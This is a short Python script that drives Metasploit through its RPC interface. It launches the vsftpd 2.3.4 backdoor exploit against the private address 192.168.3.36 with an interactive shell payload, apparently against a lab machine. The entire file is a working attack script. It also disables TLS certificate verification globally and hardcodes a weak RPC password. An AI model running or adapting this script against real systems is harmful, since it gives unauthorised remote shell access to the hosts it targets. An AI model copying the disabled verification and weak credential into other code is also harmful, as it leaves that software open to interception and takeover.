from pymetasploit3.msfrpc import MsfRpcClient

import os, ssl
if (not os.environ.get('PYTHONHTTPSVERIFY', '') and
getattr(ssl, '_create_unverified_context', None)):
  ssl._create_default_https_context = ssl._create_unverified_context

client = MsfRpcClient('123456', ssl=True)


exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
exploit['RHOSTS'] = '192.168.3.36'
print(exploit.execute(payload='cmd/unix/interact'))



